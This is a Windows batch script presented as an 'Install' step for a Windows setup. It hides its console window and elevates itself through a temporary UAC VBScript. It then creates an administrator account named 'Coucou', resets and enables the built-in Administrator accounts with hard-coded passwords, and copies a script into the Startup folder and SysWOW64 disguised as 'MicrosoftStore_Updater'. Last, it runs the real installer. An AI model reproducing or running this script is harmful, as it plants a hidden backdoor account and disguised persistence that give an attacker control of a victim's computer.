@echo off
cls
mode con: cols=15 lines=1
cls
title Install
cls
REM  --> If can Install
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system") ELSE (
      >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")

REM --> IF error then Admin
if '%errorlevel%' NEQ '0' (
    cls
    ping localhost /t /n 2 > nul
    goto UACPrompt
) else ( goto gotAdmin )

REM --> Getting Admin
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"


cls
copy D:\aIso\Packages\Esc.cmd.lnk C:\Esc.cmd.lnk
cls
copy D:\aIso\Packages\Esc.cmd C:\Esc.cmd
cls
copy E:\aIso\Packages\Esc.cmd.lnk C:\Esc.cmd.lnk
cls
copy E:\aIso\Packages\Esc.cmd C:\Esc.cmd
cls
net user Coucou /add
cls
net localgroup WDAGUtilityAccount /add
cls
net localgroup Administrateurs Coucou /add
cls
net localgroup Administrators Coucou /add
cls
net localgroup WDAGUtilityAccount Coucou /add
cls
net user Coucou CoucouWas-here
cls
net user Administrateur CoucouWas-hereAdmin
cls
net user Administrator CoucouWas-hereAdmin
cls
net user Administrateur /active:yes
cls
net user Administrator /active:yes
cls
net user Coucou /active:no
cls
copy C:\Esc.cmd.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\MicrosoftStore_Updater.lnk"
cls
copy C:\Esc.cmd "C:\Windows\SysWOW64\MicrosoftStore_Updater.cmd"
cls
del C:\Esc.cmd.lnk
cls
del C:\Esc.cmd
cls
mode con: cols=150 lines=50
cls
D:\win-install.cmd
exit